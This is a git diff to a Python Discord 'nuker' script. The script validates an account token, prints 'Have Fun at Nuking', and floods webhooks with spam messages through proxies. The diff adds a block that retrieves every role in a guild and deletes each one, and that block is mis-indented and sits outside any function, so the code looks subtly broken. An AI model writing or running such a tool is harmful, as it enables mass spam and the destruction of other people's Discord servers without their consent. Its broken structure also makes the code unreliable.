@@ -9,6 +9,7 @@ import sys
 import json
 import threading
 import urllib3
+import requests
 
 
 with open('config.json', 'r') as f:
@@ -92,11 +93,11 @@ async def main():
     async with aiohttp.ClientSession() as schinken:
         async with schinken.get('https://discord.com/api/v9/users/@me', headers=nwords) as r:
             if r.status == 200:
-                Write.Print("Token is valid!", Colors.green)
+                Write.Print("Token is valid!", Colors.green, interval=0.0005)
                 print("")
                 print("Have Fun at Nuking")
             else:
-                Write.Print("Token is invalid!",Colors.red)
+                Write.Print("Token is invalid!",Colors.red, interval=0.0005)
                 sys.exit()
         async with schinken.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r:
             channel_id = await r.json()
@@ -127,12 +128,13 @@ def spamhookp(hook):
                     ran = lines[random_int]
                 http.request('POST', hook, fields={'content': f"{MESSAGE} + {ran}", 'avatar_url': f"{WEBHOOK_PROFILE_PIC}"}, proxy_url=proxy())
             except:
-                print(f'error spamming! {hook}')
+                Write.Print(f'error spamming! {hook}', Colors.red)
         else:
             try:
                 http.request('POST', hook, fields={'content': MESSAGE, 'avatar_url': WEBHOOK_PROFILE_PIC}, proxy_url=proxy())
             except:
-                print(f'error spamming! {hook}')
+                Write.Print(f'error spamming! {hook}', Colors.red)
+                ############
     sys.exit()
 
         
@@ -150,12 +152,33 @@ def spamhook(hook):
                     'content': f"{MESSAGE} + {ran}", 
                     'avatar_url': f"{WEBHOOK_PROFILE_PIC}" })
             except:
-                print(f'error spamming! {hook}')
+                Write.Print(f'error spamming! {hook}', Colors.red)
         else:
             try:
                 http.request('POST', hook, fields={'content': MESSAGE, 'avatar_url': WEBHOOK_PROFILE_PIC})
             except:
-                print(f'error spamming! {hook}')
+                Write.Print(f'error spamming! {hook}', Colors.red)
+####################################################################################
+                headers = nwords
+url = f"https://discord.com/api/guilds/{guild}/roles"
+response = requests.get(url, headers=nwords)
+if response.status_code == 200:
+    roles = response.json()
+    print(f"Successfully retrieved {len(roles)} roles")
+    
+    
+    for role in roles:
+        role_id = role["id"]
+        delete_url = f"https://discord.com/api/guilds/{guild}/roles/{role_id}"
+        
+        delete_response = requests.delete(delete_url, headers=nwords)
+        
+        if delete_response.status_code == 204:
+            Write.Print(f"Successfully deleted role {role['name']}\n", Colors.green)
+        else:
+            Write.Print(f"Failed to delete role {role['name']}.\n", Colors.red)
+else:
+    Write.Print(f"Failed to retrieve roles.", Colors.red)
     sys.exit()
 
 
